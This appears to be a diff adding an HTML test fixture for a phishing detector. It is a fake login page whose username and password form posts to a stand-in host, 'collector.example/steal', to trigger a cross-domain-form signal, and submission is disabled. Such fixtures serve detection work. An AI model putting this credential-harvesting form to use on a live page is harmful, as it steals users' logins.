@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Fake login (cross-domain form)</title>
+</head>
+<body>
+  <h1>Fake login page that posts elsewhere (test)</h1>
+  <p>
+    The form action points to another domain, which triggers the <code>cross-domain-form</code> signal.
+    Submitting is disabled, so nothing is ever sent.
+  </p>
+  <form action="https://collector.example/steal" method="post" onsubmit="return false">
+    <input type="text" placeholder="username" />
+    <input type="password" placeholder="password" />
+    <button type="submit">Sign in</button>
+  </form>
+  <p><a href="index.html">Back to the list</a></p>
+</body>
+</html>
